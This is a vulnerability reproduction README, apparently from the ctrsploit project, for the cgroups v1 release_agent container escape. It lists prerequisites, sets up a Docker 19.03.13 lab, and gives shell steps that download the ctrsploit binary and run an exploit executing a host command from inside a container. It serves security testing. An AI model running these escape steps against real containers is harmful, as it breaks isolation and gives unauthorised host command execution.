---

tags: sploit
author: ssst0n3
spec_version: v0.1.0
version: v0.2.0
changelog:
    - v0.2.0: bump to sploit-spec v0.5.1
    - v0.1.0: init

---

# release agent escape 

[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/release_agent/README.md)

## 1. Vulnerability Overview

TODO

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

vulnerability existence:
1. CAP_BND: CAP_SYS_ADMIN

vulnerability exploitable:
1. CAP_EFF: CAP_SYS_ADMIN
2. root user in container
3. cgroups v1
4. top level cgroups subsystem
5. allow mount syscall

## 4. Vulnerability Existence Check

`ctrsploit checksec release_agent`

## 5. Reproduce

### 5.1 Reproduce Environment

```
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v19.03.13
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
$ ./ssh
root@localhost:~# docker info
Client:
 Debug Mode: false

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 5.4.0-216-generic
 Operating System: Ubuntu 20.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.925GiB
 Name: localhost.localdomain
 ID: TMRQ:LVOI:V7X3:3DPS:RD7Z:B33X:HKKJ:CBET:ETRH:7ZFA:LTHU:KXPO
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: No swap limit support
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined busybox
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit --colorful checksec release_agent
✔  release_agent	# Container can be escaped when has cap_sys_admin and use cgroups v1

/ # ctrsploit exploit ra -c 'docker ps '
INFO[0001] 
===========start of result==============
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
4a2fe985bd56        busybox             "sh"                33 seconds ago      Up 31 seconds                           poc
===========end of result==============
```
